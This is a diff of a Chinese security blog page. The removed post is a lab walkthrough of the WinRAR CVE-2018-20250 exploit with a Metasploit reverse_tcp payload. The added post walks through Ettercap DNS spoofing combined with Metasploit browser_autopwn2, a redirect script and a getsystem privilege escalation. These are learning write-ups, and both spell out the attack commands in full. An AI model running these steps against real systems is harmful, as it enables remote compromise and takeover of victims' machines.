@@ -98,31 +98,34 @@
 
 
 
-  <meta name="description" content="1.漏洞细节 https://research.checkpoint.com/extracting-code-execution-from-winrar/  2.漏洞影响版本 WinRAR &amp;lt; 5.70 Beta 1 Bandizip &amp;lt; = 6.2.0.0 好压(2345压缩) &amp;lt; = 5.9.8.10907 360压缩 &amp;lt; = 4.0.0.1170  3.漏洞复现环境">
-<meta name="keywords" content="漏洞复现">
+  <meta name="description" content="1.工具介绍1.1Ettercap Ettercap是一个全面中间人攻击工具。它具有实时连接嗅探、动态内容过滤和许多其他有趣的功能。它支持对许多协议的主动和被动分析，并包含许多用于网络和主机分析的特性。  1.2MSF模块：browser_autopwn2 browser_autopwn2是Metasploit提供的辅助功能模块。在受害者访问Web页面时，它会自动攻击受害者的浏览器。在开始攻击之前">
 <meta property="og:type" content="article">
-<meta property="og:title" content="&#39;WinRAR目录穿越漏洞复现（CVE-2018-20250）&#39;">
-<meta property="og:url" content="https://chirec.github.io/2019/03/15/Writeup-on-CVE-2018-20250/index.html">
+<meta property="og:title" content="&#39;使用Ettercap和MSF模块进行DNS欺骗，并植入后门&#39;">
+<meta property="og:url" content="https://chirec.github.io/2019/04/08/browser-autopwn2/index.html">
 <meta property="og:site_name" content="Emerald Dream">
-<meta property="og:description" content="1.漏洞细节 https://research.checkpoint.com/extracting-code-execution-from-winrar/  2.漏洞影响版本 WinRAR &amp;lt; 5.70 Beta 1 Bandizip &amp;lt; = 6.2.0.0 好压(2345压缩) &amp;lt; = 5.9.8.10907 360压缩 &amp;lt; = 4.0.0.1170  3.漏洞复现环境">
+<meta property="og:description" content="1.工具介绍1.1Ettercap Ettercap是一个全面中间人攻击工具。它具有实时连接嗅探、动态内容过滤和许多其他有趣的功能。它支持对许多协议的主动和被动分析，并包含许多用于网络和主机分析的特性。  1.2MSF模块：browser_autopwn2 browser_autopwn2是Metasploit提供的辅助功能模块。在受害者访问Web页面时，它会自动攻击受害者的浏览器。在开始攻击之前">
 <meta property="og:locale" content="en">
-<meta property="og:image" content="https://chirec.github.io/2019/03/15/Writeup-on-CVE-2018-20250/01.evasion.png">
-<meta property="og:image" content="https://chirec.github.io/2019/03/15/Writeup-on-CVE-2018-20250/02.run.png">
-<meta property="og:image" content="https://chirec.github.io/2019/03/15/Writeup-on-CVE-2018-20250/03.edit.png">
-<meta property="og:image" content="https://chirec.github.io/2019/03/15/Writeup-on-CVE-2018-20250/04.Evil.png">
-<meta property="og:image" content="https://chirec.github.io/2019/03/15/Writeup-on-CVE-2018-20250/05.session-opened.png">
-<meta property="og:updated_time" content="2019-03-24T07:50:57.816Z">
+<meta property="og:image" content="https://chirec.github.io/2019/04/08/browser-autopwn2/browser-autopwn2.assets/1554723324108.png">
+<meta property="og:image" content="https://chirec.github.io/2019/04/08/browser-autopwn2/browser-autopwn2.assets/1554723937450.png">
+<meta property="og:image" content="https://chirec.github.io/2019/04/08/browser-autopwn2/browser-autopwn2.assets/1554724622213.png">
+<meta property="og:image" content="https://chirec.github.io/2019/04/08/browser-autopwn2/browser-autopwn2.assets/1554724244077.png">
+<meta property="og:image" content="https://chirec.github.io/2019/04/08/browser-autopwn2/browser-autopwn2.assets/1554724744236.png">
+<meta property="og:image" content="https://chirec.github.io/2019/04/08/browser-autopwn2/browser-autopwn2.assets/1554724347201.png">
+<meta property="og:image" content="https://chirec.github.io/2019/04/08/browser-autopwn2/browser-autopwn2.assets/1554724417823.png">
+<meta property="og:image" content="https://chirec.github.io/2019/04/08/browser-autopwn2/browser-autopwn2.assets/1554724485245.png">
+<meta property="og:image" content="https://chirec.github.io/2019/04/08/browser-autopwn2/browser-autopwn2.assets/1554724511871.png">
+<meta property="og:updated_time" content="2019-04-08T12:01:25.579Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="&#39;WinRAR目录穿越漏洞复现（CVE-2018-20250）&#39;">
-<meta name="twitter:description" content="1.漏洞细节 https://research.checkpoint.com/extracting-code-execution-from-winrar/  2.漏洞影响版本 WinRAR &amp;lt; 5.70 Beta 1 Bandizip &amp;lt; = 6.2.0.0 好压(2345压缩) &amp;lt; = 5.9.8.10907 360压缩 &amp;lt; = 4.0.0.1170  3.漏洞复现环境">
-<meta name="twitter:image" content="https://chirec.github.io/2019/03/15/Writeup-on-CVE-2018-20250/01.evasion.png">
+<meta name="twitter:title" content="&#39;使用Ettercap和MSF模块进行DNS欺骗，并植入后门&#39;">
+<meta name="twitter:description" content="1.工具介绍1.1Ettercap Ettercap是一个全面中间人攻击工具。它具有实时连接嗅探、动态内容过滤和许多其他有趣的功能。它支持对许多协议的主动和被动分析，并包含许多用于网络和主机分析的特性。  1.2MSF模块：browser_autopwn2 browser_autopwn2是Metasploit提供的辅助功能模块。在受害者访问Web页面时，它会自动攻击受害者的浏览器。在开始攻击之前">
+<meta name="twitter:image" content="https://chirec.github.io/2019/04/08/browser-autopwn2/browser-autopwn2.assets/1554723324108.png">
 
 
 
 
 
 
-  <link rel="canonical" href="https://chirec.github.io/2019/03/15/Writeup-on-CVE-2018-20250/">
+  <link rel="canonical" href="https://chirec.github.io/2019/04/08/browser-autopwn2/">
 
 
 
@@ -132,7 +135,7 @@
   };
 </script>
 
-  <title>'WinRAR目录穿越漏洞复现（CVE-2018-20250）' | Emerald Dream</title>
+  <title>'使用Ettercap和MSF模块进行DNS欺骗，并植入后门' | Emerald Dream</title>
   
 
 
@@ -308,7 +311,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://chirec.github.io/2019/03/15/Writeup-on-CVE-2018-20250/">
+    <link itemprop="mainEntityOfPage" href="https://chirec.github.io/2019/04/08/browser-autopwn2/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="chessur">
@@ -325,7 +328,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">'WinRAR目录穿越漏洞复现（CVE-2018-20250）'
+          <h1 class="post-title" itemprop="name headline">'使用Ettercap和MSF模块进行DNS欺骗，并植入后门'
 
               
             
@@ -351,7 +354,7 @@
                 
               
 
-              <time title="Created: 2019-03-15 19:25:33" itemprop="dateCreated datePublished" datetime="2019-03-15T19:25:33+08:00">2019-03-15</time>
+              <time title="Created: 2019-04-08 19:01:44" itemprop="dateCreated datePublished" datetime="2019-04-08T19:01:44+08:00">2019-04-08</time>
             
 
             
@@ -386,16 +389,13 @@
       
 
       
-        <h1 id="1-漏洞细节"><a href="#1-漏洞细节" class="headerlink" title="1.漏洞细节"></a>1.漏洞细节</h1><blockquote>
-<p><a href="https://research.checkpoint.com/extracting-code-execution-from-winrar/" target="_blank" rel="noopener">https://research.checkpoint.com/extracting-code-execution-from-winrar/</a></p>
+        <h1 id="1-工具介绍"><a href="#1-工具介绍" class="headerlink" title="1.工具介绍"></a>1.工具介绍</h1><h2 id="1-1Ettercap"><a href="#1-1Ettercap" class="headerlink" title="1.1Ettercap"></a>1.1Ettercap</h2><blockquote>
+<p>Ettercap是一个全面中间人攻击工具。它具有实时连接嗅探、动态内容过滤和许多其他有趣的功能。它支持对许多协议的主动和被动分析，并包含许多用于网络和主机分析的特性。</p>
 </blockquote>
-<h1 id="2-漏洞影响版本"><a href="#2-漏洞影响版本" class="headerlink" title="2.漏洞影响版本"></a>2.漏洞影响版本</h1><blockquote>
-<p>WinRAR &lt; 5.70 Beta 1</p>
-<p>Bandizip &lt; = 6.2.0.0</p>
-<p>好压(2345压缩) &lt; = 5.9.8.10907</p>
-<p>360压缩 &lt; = 4.0.0.1170</p>
+<h2 id="1-2MSF模块：browser-autopwn2"><a href="#1-2MSF模块：browser-autopwn2" class="headerlink" title="1.2MSF模块：browser_autopwn2"></a>1.2MSF模块：browser_autopwn2</h2><blockquote>
+<p>browser_autopwn2是Metasploit提供的辅助功能模块。在受害者访问Web页面时，它会自动攻击受害者的浏览器。在开始攻击之前，browser_autopwn2能够检测用户使用的浏览器类型， browser_autopwn2将根据浏览器的检测结果，自行选择最合适的EXP。</p>
 </blockquote>
-<h1 id="3-漏洞复现环境"><a href="#3-漏洞复现环境" class="headerlink" title="3.漏洞复现环境"></a>3.漏洞复现环境</h1><table>
+<h1 id="2-实验环境"><a href="#2-实验环境" class="headerlink" title="2.实验环境"></a>2.实验环境</h1><table>
 <thead>
 <tr>
 <th style="text-align:center">角色</th>
@@ -407,44 +407,41 @@
 <tbody>
 <tr>
 <td style="text-align:center">靶机</td>
-<td style="text-align:center">Windows7（64bit）</td>
-<td style="text-align:center">192.168.126.128</td>
-<td style="text-align:center">安装WinRAR版本为5.6.1，关闭防火墙</td>
-</tr>
-<tr>
-<td style="text-align:center">攻击机</td>
-<td style="text-align:center">Kali Linux 64 Bit <strong>2019.1a</strong></td>
-<td style="text-align:center">192.168.126.126</td>
-<td style="text-align:center">Metasploit版本为5.0.2</td>
-</tr>
-<tr>
-<td style="text-align:center">攻击机</td>
-<td style="text-align:center">WIndows10（64bit）</td>
+<td style="text-align:center">Windows Server 2003</td>
+<td style="text-align:center">192.168.126.149</td>
 <td style="text-align:center"></td>
-<td style="text-align:center">安装Python3.7.2</td>
+</tr>
+<tr>
+<td style="text-align:center">攻击机</td>
+<td style="text-align:center">Kali Linux 64 bit <strong>2019.1a</strong></td>
+<td style="text-align:center">192.168.126.126</td>
 </tr>
 </tbody>
 </table>
-<p>exp下载：<a href="https://github.com/WyAtu/CVE-2018-20250/" target="_blank" rel="noopener">https://github.com/WyAtu/CVE-2018-20250/</a></p>
-<a id="more"></a>
-<h1 id="4-漏洞复现过程"><a href="#4-漏洞复现过程" class="headerlink" title="4.漏洞复现过程"></a>4.漏洞复现过程</h1><h2 id="4-1使用Metasploit5生成免杀Payload"><a href="#4-1使用Metasploit5生成免杀Payload" class="headerlink" title="4.1使用Metasploit5生成免杀Payload"></a>4.1使用Metasploit5生成免杀Payload</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use evasion/windows/windows_defender_exe</span><br><span class="line">show info</span><br><span class="line">set filename WinRAR.exe</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">show options</span><br><span class="line">set lhost 192.168.126.126</span><br><span class="line">set lport 10260</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-<img src="/2019/03/15/Writeup-on-CVE-2018-20250/01.evasion.png"> 
-<img src="/2019/03/15/Writeup-on-CVE-2018-20250/02.run.png"> 
-<h2 id="4-2使用exp生成恶意程序"><a href="#4-2使用exp生成恶意程序" class="headerlink" title="4.2使用exp生成恶意程序"></a>4.2使用exp生成恶意程序</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /root/Desktop</span><br><span class="line">git clone https://github.com/WyAtu/CVE-2018-20250.git</span><br><span class="line">cd CVE-2018-20250</span><br><span class="line">cp /root/.msf4/local/WinRAR.exe ./</span><br><span class="line">vim exp.py</span><br></pre></td></tr></table></figure>
-<p>将exp.py中的evil_filename = “calc.exe”改为”WinRAR.exe”</p>
-<img src="/2019/03/15/Writeup-on-CVE-2018-20250/03.edit.png"> 
-<p>将CVE-2018-20250文件夹复制到Windows10中，执行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exp.py</span><br></pre></td></tr></table></figure>
-<p>生成恶意程序test.rar</p>
-<img src="/2019/03/15/Writeup-on-CVE-2018-20250/04.Evil.png"> 
-<h2 id="4-3在靶机上运行恶意程序"><a href="#4-3在靶机上运行恶意程序" class="headerlink" title="4.3在靶机上运行恶意程序"></a>4.3在靶机上运行恶意程序</h2><p>将test.rar复制到Windows7上，解压运行</p>
-<h2 id="4-4在Kali-Linux上执行Metasploit监听"><a href="#4-4在Kali-Linux上执行Metasploit监听" class="headerlink" title="4.4在Kali Linux上执行Metasploit监听"></a>4.4在Kali Linux上执行Metasploit监听</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">show options</span><br><span class="line">set lhost 192.168.126.126</span><br><span class="line">set lport 10260</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-<h2 id="4-5控制靶机"><a href="#4-5控制靶机" class="headerlink" title="4.5控制靶机"></a>4.5控制靶机</h2><p>Windows7重启之后，Kali Linux会收到会话，此时执行shell即可获得靶机权限。</p>
-<img src="/2019/03/15/Writeup-on-CVE-2018-20250/05.session-opened.png"> 
-<h1 id="5-总结"><a href="#5-总结" class="headerlink" title="5.总结"></a>5.总结</h1><p>刚刚学了2个星期的渗透测试，仅仅做了漏洞复现，没有分析漏洞原理。</p>
-<h1 id="6-参考文章"><a href="#6-参考文章" class="headerlink" title="6.参考文章"></a>6.参考文章</h1><p>[1] <a href="https://research.checkpoint.com/extracting-code-execution-from-winrar/" target="_blank" rel="noopener">Extracting a 19 Year Old Code Execution from WinRAR</a></p>
-<p>[2] <a href="https://www.freebuf.com/vuls/197745.html" target="_blank" rel="noopener">WinRAR目录穿越漏洞浅析及复现（CVE-2018-20250）</a></p>
-<p>[3] <a href="https://www.freebuf.com/articles/network/197025.html" target="_blank" rel="noopener">WinRAR远程代码执行漏洞结合Metasploit+Ngrok实现远程上线</a></p>
+<h1 id="3-实验过程"><a href="#3-实验过程" class="headerlink" title="3.实验过程"></a>3.实验过程</h1><h2 id="3-1使用Ettercap进行DNS欺骗"><a href="#3-1使用Ettercap进行DNS欺骗" class="headerlink" title="3.1使用Ettercap进行DNS欺骗"></a>3.1使用Ettercap进行DNS欺骗</h2><p>DNS欺骗过程和<a href="https://chirec.github.io/2019/03/26/I-can-not-see-U/">使用Ettercap和SET进行DNS欺骗、钓鱼</a>过程相同，可以查看这篇文章。<br>注意：进行DNS欺骗后，要开启Apache2服务才可以正常访问。上一篇中，SET自动开启了80端口，所以不需要开启Apache2服务。<br>开启Apache2服务命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/apache2 start</span><br><span class="line">/etc/init.d/apache2 status</span><br></pre></td></tr></table></figure>
+<p><img src="browser-autopwn2.assets/1554723324108.png" alt="1554723324108"></p>
+<h2 id="3-2MSF模块生成恶意URL"><a href="#3-2MSF模块生成恶意URL" class="headerlink" title="3.2MSF模块生成恶意URL"></a>3.2MSF模块生成恶意URL</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/postgresql start</span><br><span class="line">msfdb init</span><br><span class="line">msfconsole</span><br><span class="line">search browser_autopwn2</span><br><span class="line">use auxiliary/server/browser_autopwn2</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p>没有什么需要修改的设置，使用模块之后，直接run就可以生成恶意URL了</p>
+<p><img src="browser-autopwn2.assets/1554723937450.png" alt="1554723937450"></p>
+<h2 id="3-3添加跳转脚本"><a href="#3-3添加跳转脚本" class="headerlink" title="3.3添加跳转脚本"></a>3.3添加跳转脚本</h2><p>生成URL过程比较慢，这段时间我们给主页添加跳转脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt; </span><br><span class="line">// 以下方式定时跳转</span><br><span class="line">setTimeout(&quot;javascript:location.href=&apos;Hello！&apos;&quot;, 1000); </span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>将上方代码中的Hello！替换为MSF生成的恶意URL即可。</p>
+<p><img src="browser-autopwn2.assets/1554724622213.png" alt="1554724622213"></p>
+<h2 id="3-4靶机访问"><a href="#3-4靶机访问" class="headerlink" title="3.4靶机访问"></a>3.4靶机访问</h2><p>访问<a href="www.baidu.com">www.baidu.com</a>，可以看到访问的是刚刚写的index.html</p>
+<p><img src="browser-autopwn2.assets/1554724244077.png" alt="1554724244077"></p>
+<p>自动跳转到恶意URL</p>
+<p><img src="browser-autopwn2.assets/1554724744236.png" alt="1554724744236"></p>
+<h2 id="3-5测试结果"><a href="#3-5测试结果" class="headerlink" title="3.5测试结果"></a>3.5测试结果</h2><p>在靶机访问恶意URL之后，MSF开始根据浏览器版本选择使用EXP并创建会话</p>
+<p><img src="browser-autopwn2.assets/1554724347201.png" alt="1554724347201"></p>
+<h2 id="3-6启动会话"><a href="#3-6启动会话" class="headerlink" title="3.6启动会话"></a>3.6启动会话</h2><p>MSF创建会话之后，我们需要手动启用会话</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions -l</span><br></pre></td></tr></table></figure>
+<p><img src="browser-autopwn2.assets/1554724417823.png" alt="1554724417823"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions -i 1</span><br></pre></td></tr></table></figure>
+<p><img src="browser-autopwn2.assets/1554724485245.png" alt="1554724485245"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getuid</span><br><span class="line">getsystem</span><br><span class="line">getuid</span><br></pre></td></tr></table></figure>
+<p><img src="browser-autopwn2.assets/1554724511871.png" alt="1554724511871"></p>
+<h1 id="4-参考"><a href="#4-参考" class="headerlink" title="4.参考"></a>4.参考</h1><p>[1] <a href="https://blog.csdn.net/Sufeiboy/article/details/57407019" target="_blank" rel="noopener">MSF自动化浏览器攻击与后门安装</a></p>
 
       
     </div>
@@ -466,12 +463,6 @@
 
     <footer class="post-footer">
       
-        <div class="post-tags">
-          
-            <a href="/tags/漏洞复现/" rel="tag"># 漏洞复现</a>
-          
-        </div>
-      
 
       
       
@@ -481,8 +472,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/03/14/How-to-Creat-a-Blog-with-Hexo&GitHub/" rel="next" title="'Hexo+GitHub搭建Blog过程'">
-                <i class="fa fa-chevron-left"></i> 'Hexo+GitHub搭建Blog过程'
+              <a href="/2019/03/29/Create-Message-Board-with-PHP-Version-2-0/" rel="next" title="'使用PHP编写留言板Version2.0'">
+                <i class="fa fa-chevron-left"></i> '使用PHP编写留言板Version2.0'
               </a>
             
           </div>
@@ -490,10 +481,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/03/18/Brief-Introduction-on-Medusa&Hydra/" rel="prev" title="'Medusa和Hydra对比'">
-                'Medusa和Hydra对比' <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -634,7 +621,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1-漏洞细节"><span class="nav-text">1.漏洞细节</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-漏洞影响版本"><span class="nav-text">2.漏洞影响版本</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#3-漏洞复现环境"><span class="nav-text">3.漏洞复现环境</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#4-漏洞复现过程"><span class="nav-text">4.漏洞复现过程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#4-1使用Metasploit5生成免杀Payload"><span class="nav-text">4.1使用Metasploit5生成免杀Payload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-2使用exp生成恶意程序"><span class="nav-text">4.2使用exp生成恶意程序</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-3在靶机上运行恶意程序"><span class="nav-text">4.3在靶机上运行恶意程序</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-4在Kali-Linux上执行Metasploit监听"><span class="nav-text">4.4在Kali Linux上执行Metasploit监听</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-5控制靶机"><span class="nav-text">4.5控制靶机</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#5-总结"><span class="nav-text">5.总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#6-参考文章"><span class="nav-text">6.参考文章</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1-工具介绍"><span class="nav-text">1.工具介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-1Ettercap"><span class="nav-text">1.1Ettercap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-2MSF模块：browser-autopwn2"><span class="nav-text">1.2MSF模块：browser_autopwn2</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-实验环境"><span class="nav-text">2.实验环境</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#3-实验过程"><span class="nav-text">3.实验过程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#3-1使用Ettercap进行DNS欺骗"><span class="nav-text">3.1使用Ettercap进行DNS欺骗</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-2MSF模块生成恶意URL"><span class="nav-text">3.2MSF模块生成恶意URL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-3添加跳转脚本"><span class="nav-text">3.3添加跳转脚本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-4靶机访问"><span class="nav-text">3.4靶机访问</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-5测试结果"><span class="nav-text">3.5测试结果</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-6启动会话"><span class="nav-text">3.6启动会话</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#4-参考"><span class="nav-text">4.参考</span></a></li></ol></div>
             
 
           </div>
